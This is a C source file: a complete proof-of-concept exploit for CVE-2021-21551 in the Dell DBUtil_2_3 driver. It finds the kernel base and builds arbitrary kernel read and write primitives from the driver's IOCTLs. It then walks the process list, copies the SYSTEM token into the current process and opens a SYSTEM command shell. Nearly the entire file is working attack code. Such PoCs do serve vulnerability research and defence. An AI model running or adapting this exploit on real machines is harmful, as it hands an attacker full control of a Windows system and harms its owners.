//include NtDll SDK
#include "D:\work\SDK\ntdll.h"
#pragma comment(lib, "ntdll.lib")

//include windows SDK and stdio for logging
#include <Windows.h>
#include <stdio.h>

//print error message, wait for enter and terminate
void __declspec(noreturn) error(const char* szErr)
{
	printf("[-] %s\n", szErr);

	getchar();
	exit(-1);
}

//acquire base address of ntoskrnl.exe module in kernel space
PCHAR GetKernelBase(void)
{
	//get required size of SystemModuleInformation array
	DWORD dwSize = 0;

	if (NtQuerySystemInformation(SystemModuleInformation, nullptr, dwSize, &dwSize) != STATUS_INFO_LENGTH_MISMATCH)
		error("Cannot get length of system module list array");

	//alloc mem for system modules
	PRTL_PROCESS_MODULES pSystemModules = (PRTL_PROCESS_MODULES)malloc(dwSize);

	if (!pSystemModules)
		error("Cannot allocate memory for system module list");

	//query system modules
	if (!NT_SUCCESS(NtQuerySystemInformation(SystemModuleInformation, pSystemModules, dwSize, &dwSize)))
		error("Cannot get system module list");

	DWORD dwCount = pSystemModules->NumberOfModules;
	printf("[+] Found %d system modules\n", dwCount);

	//for each system module check its full path name for substring "ntoskrnl.exe"
	for (DWORD i = 0; i < dwCount; i++)
	{
		if (strstr((const char*)pSystemModules->Modules[i].FullPathName, "ntoskrnl.exe"))
		{
			//now get the image base addr
			PCHAR pBase = (PCHAR)pSystemModules->Modules[i].ImageBase;

			printf("[+] Found kernel base at 0x%p\n", pBase);

			//free system module list and return leaked base address
			free(pSystemModules);
			return pBase;
		}
	}

	//this shouldn't happen
	error("Cannot find ntoskrnl.exe in system module list");
}

//this struct is based on reverse engineering exploited driver
typedef struct _IOCTL_STRUCT
{
	ULONGLONG unk0;
	PCHAR address;
	ULONGLONG zero; //value added to address so always set it to zero for 'linearity'
	PCHAR value;
} IOCTL_STRUCT;

//arbitrary kernel memory read
PCHAR ReadKernelMemory(HANDLE hDevice, PCHAR addr)
{
	DWORD dwBytesReturned;
	IOCTL_STRUCT ioctl_struct;

	//driver will read from address (ioctl_struct.address + ioctl_struct.zero)
	ioctl_struct.address = addr;
	ioctl_struct.zero = 0;
	
	if (!DeviceIoControl(hDevice, 0x9b0c1ec4, &ioctl_struct, sizeof(ioctl_struct), &ioctl_struct, sizeof(ioctl_struct), &dwBytesReturned, nullptr))
		error("Error in ioctl read command");
	
	return ioctl_struct.value; //returned value
}

//arbitrary kernel memory write <3
void WriteKernelMemory(HANDLE hDevice, PCHAR addr, PCHAR value)
{
	DWORD dwBytesReturned;
	IOCTL_STRUCT ioctl_struct;

	//populate ioctl param struct
	ioctl_struct.address = addr;
	ioctl_struct.zero = 0;
	ioctl_struct.value = value;

	//abracadabra
	if (!DeviceIoControl(hDevice, 0x9b0c1ec8, &ioctl_struct, sizeof(ioctl_struct), &ioctl_struct, sizeof(ioctl_struct), &dwBytesReturned, nullptr))
		error("Error in ioctl write command");
}

//main console application
DWORD main(DWORD argc, CHAR* argv[])
{
	//hello world
	printf("\n******************************************\n");
	printf("CVE-2021-21551 PoC exploit by mathisvickie");
	printf("\n******************************************\n\n");
	
	// !IMPORTANT! update these offsets to suit your windows build
	DWORD EPROCESS_ActiveProcessLinks = 0x2e8;
	DWORD EPROCESS_Token = 0x348;

	//load ntoskrnl.exe as resource
	HMODULE hNtOsKrnl = LoadLibraryExW(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);

	if (!hNtOsKrnl)
		error("Cannot load ntoskrnl.exe");

	//get addr of PsInitialSystemProcess minus base of resource plus base addr of loaded kernel = kernel address of PsInitialSystemProcess
	PCHAR PsInitialSystemProcess = (PCHAR)GetProcAddress(hNtOsKrnl, "PsInitialSystemProcess") - (PCHAR)hNtOsKrnl + GetKernelBase();

	//ntoskrnl resource is no longer needed
	FreeLibrary(hNtOsKrnl);
	printf("[+] Found PsInitialSystemProcess at 0x%p\n", PsInitialSystemProcess);
	
	//open handle to exploitable device
	HANDLE hDevice = CreateFileW(L"\\\\.\\DBUtil_2_3", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	
	if (hDevice == INVALID_HANDLE_VALUE)
		error("Cannot open handle to vulnerable driver, is the service running?");
	
	printf("[+] Opened vulnerable device handle 0x%p\n", hDevice);

	//using new handle read PsInitialSystemProcess to get system EPROCESS
	PCHAR SystemEPROCESS = ReadKernelMemory(hDevice, PsInitialSystemProcess);
	printf("[+] Found System EPROCESS struct at 0x%p\n", SystemEPROCESS);

	//from system EPROCESS get ActiveProcessLinks (we need to find our EPROCESS)
	PCHAR ActiveProcessLinks = ReadKernelMemory(hDevice, SystemEPROCESS + EPROCESS_ActiveProcessLinks);

	//steal system token from system EPROCESS
	PCHAR SystemToken = (PCHAR)((ULONGLONG)ReadKernelMemory(hDevice, SystemEPROCESS + EPROCESS_Token) & 0xfffffffffffffff0);
	printf("[+] Stealing system token 0x%p\n", SystemToken);

	//now loop through ActiveProcessLinks to find our EPROCESS, UniqueProcessId is always right behind ActiveProcessLinks
	while (true)
	{
		if ((DWORD)ReadKernelMemory(hDevice, ActiveProcessLinks - 8) == GetCurrentProcessId())
		{
			//subtract ActiveProcessLinks offset to get EPROCESS
			PCHAR CurrentEPROCESS = ActiveProcessLinks - EPROCESS_ActiveProcessLinks;
			printf("[+] Found current EPROCESS struct at 0x%p\n", CurrentEPROCESS);

			//finally overwrite our token to system one
			printf("[+] Overriding current token now...\n");
			WriteKernelMemory(hDevice, CurrentEPROCESS + EPROCESS_Token, SystemToken);

			break; //exit loop
		}

		//not current process, try next one
		ActiveProcessLinks = ReadKernelMemory(hDevice, ActiveProcessLinks);
	}

	//device is no longer needed, we are elevated
	CloseHandle(hDevice);

	//system please!
	system("cmd");

	//wait and return success
	getchar();
	return 0;
}
